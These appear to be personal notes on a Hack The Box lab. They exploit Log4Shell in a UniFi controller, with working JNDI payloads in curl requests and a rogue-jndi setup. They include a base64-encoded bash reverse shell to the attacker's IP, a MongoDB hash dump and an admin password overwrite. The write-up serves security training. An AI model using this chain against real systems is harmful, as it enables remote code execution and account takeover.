https://www.hackthebox.com/blog/Whats-Going-On-With-Log4j-Exploitation

#CVE-2021-44228
Log4J in a very well known network appliance monitoring system called "UniFi"
the Log4J vulnerability manipulate a POST header called remember , giving you a reverse shell on the machine. You'll also change the administrator's password by altering the hash saved in the MongoDB instance that is running on the system, which will allow access to the administration panel and leads to the disclosure of the administrator's SSH password.



we intercept the login request with burp and add our payload into remember parameter 
![[Pasted image 20221118184918.png]]

**JNDI: is the acronym for the Java Naming and Directory Interface API**
**LDAP: is the acronym for Lightweight Directory Access Protocol**
if we get an error that means there is the website is vulnerable to Log4j 

Payload:
```javascript
"${jndi:ldap://10.10.16.24/something}"

```
https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi

**Check for vuln** 

To test for the vulnerability, let’s first grab a hostname from dnslog.cn and insert it in the following cURL command:
```bash
curl -i -s -k -X POST -H $'Host: 192.168.11.10:8443' -H $'Content-Length: 104' --data-binary $'{\"username\":\"a\",\"password\":\"a\",\"remember\":\"${jndi:ldap://eb0uvi.dnslog.cn:1389/o=tomcat}\",\"strict\":true}' $'https://192.168.11.10:8443/api/login'



curl -i -s -k -X POST -H $'Host: 10.129.96.149:8443' -H $'Content-Length: 104' --data-binary $'{\"username\":\"a\",\"password\":\"a\",\"remember\":\"${jndi:ldap://10.10.16.42:80/o=tomcat}\",\"strict\":true}' $'https://10.129.96.149:8443/api/login'  


```

![[Pasted image 20221118194150.png]]
and we have Log4j
Let's proceed to starting tcpdump on port 389 , which will monitor the network traffic for LDAP connections.

```
sudo tcpdump -i tun0 port 389
```

We will have to install Open-JDK and Maven on our system in order to build a payload that we can send to the server and will give us Remote Code Execution on the vulnerable system

**Open-JDK: is the Java Development kit, which is used to build Java applications**

**Maven: is an Integrated Development Environment (IDE) that can be used to create a structured project and compile our projects into jar files .**

These applications will also help us run the rogue-jndi Java application, which starts a local LDAP server and allows us to receive connections back from the vulnerable server and execute malicious code.

```bash

# openjdk
sudo apt update
sudo apt install openjdk-11-jdk -y 
java -version

# maven
sudo apt-get install maven

mvn -v 


# Rouge jdi
git clone https://github.com/veracode-research/rogue-jndi && cd rogue-jndi && mvn package
```
![[Pasted image 20221118200618.png]]

This will create a .jar file in rogue-jndi/target/ directory called RogueJndi-1.1.jar . Now we can construct our payload to pass into the RogueJndi-1-1.jar Java application

To use the Rogue-JNDI server we will have to construct and pass it a payload, which will be responsible for giving us a shell on the affected system. We will be Base64 encoding the payload to prevent any encoding issues.

```bash
echo 'bash -c bash -i >&/dev/tcp/{Your IP Address}/{A port of your choice} 0>&1' | base64

java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,BASE64 STRING HERE}| {base64,-d}|{bash,-i}" --hostname "{YOUR TUN0 IP ADDRESS}

# e.g

java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTYuNDIvOTAwMSAwPiYxCg==}|{base64,- d}|{bash,-i}" --hostname "10.10.16.42"


```
![[Pasted image 20221118201004.png]]

now we open a listener and run our payload

```bash
nc -lvp 4444 #listener 

${jndi:ldap://{Your Tun0 IP}:1389/o=tomcat} # remember paramater value

curl -i -s -k -X POST -H $'Host: 10.129.96.149:8443' -H $'Content-Length: 104' --data-binary $'{\"username\":\"a\",\"password\":\"a\",\"remember\":\"${jndi:ldap://10.10.16.42:1389/o=tomcat}\",\"strict\":true}' $'https://10.129.96.149:8443/api/login' # curl for the request

```
![[Pasted image 20221118204812.png]]

# Privilege escalation 

Look for mongodb on the machine [[03 Commands/Linux/Linux]]
```bash
ps aux | grep mongo
```
![[Pasted image 20221118205506.png]]


## extract admin password


```bash
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
```
![[Pasted image 20221118210446.png]]


![[Pasted image 20221118210115.png]]

now we can send this hash to hash cat and crack it 

![[Pasted image 20221118210355.png]]
or if it's hard to crack it we can try to change the password value in Mongodb with out password to do that
first we need to create a password with same encryption

```bash
mkpasswd -m SHA-512 password123
```
Let's proceed to replacing the existing hash with the one we created.



```bash
# Change the password value to our password

mongo --port 27117 ace --eval 'db.admin.update({"_id": ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"SHA_512 Hash Generated"}})'


```
![[Pasted image 20221118211043.png]]
now we have access to UniFi and we can login as administrator 
![[Pasted image 20221118211355.png]]

UniFi offers a setting for SSH Authentication, which is a functionality that allows you to administer other Access Points over SSH from a console or terminal.
Navigate to settings -> site and scroll down to find the SSH Authentication setting. SSH authentication with a root password has been enabled.

![[Pasted image 20221118211459.png]]

![[Pasted image 20221118211558.png]]

 ---
Tags: #log4j
Resources: